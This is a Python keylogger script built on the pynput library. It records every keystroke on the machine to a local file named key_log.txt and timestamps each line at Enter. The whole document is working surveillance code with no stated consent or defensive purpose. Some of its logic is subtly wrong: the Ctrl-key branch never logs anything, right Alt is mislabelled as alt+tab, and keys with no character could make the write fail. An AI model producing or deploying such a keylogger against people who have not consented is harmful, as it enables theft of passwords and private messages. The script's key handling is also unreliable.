from pynput import keyboard
import datetime

def on_press(key):
    # Map key types to their string representations
    key_map = {
        keyboard.Key.space: ' ',
        keyboard.Key.backspace: '<backspace>',
        keyboard.Key.tab: '<tab>',
        keyboard.Key.alt_r: '<alt+tab>',
        keyboard.Key.enter: '\n'
    }

    # Write key representation to file
    with open('key_log.txt', 'a') as f:
        # If the key is the enter key, write the date and time to the file
        if key == keyboard.Key.enter:
            # Get the current date and time
            now = datetime.datetime.now()
            # Format the date and time as a string
            date_time_str = now.strftime('%Y-%m-%d %H:%M:%S')
            # Write the date and time to the file
            f.write(f'\n[{date_time_str}] ')
        # Special keys
        elif key in key_map:
            f.write(key_map[key])
        # Control keys
        elif (key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r):
            char = getattr(key, 'char', None)
            if char and char.isalpha():
                f.write(f'<ctrl+{char.lower()}>')
            elif char and char.isdigit():
                f.write(f'<ctrl+{char}>')
        # Printable keys
        else:
            f.write(getattr(key, 'char', ''))





# Collect events until released
with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
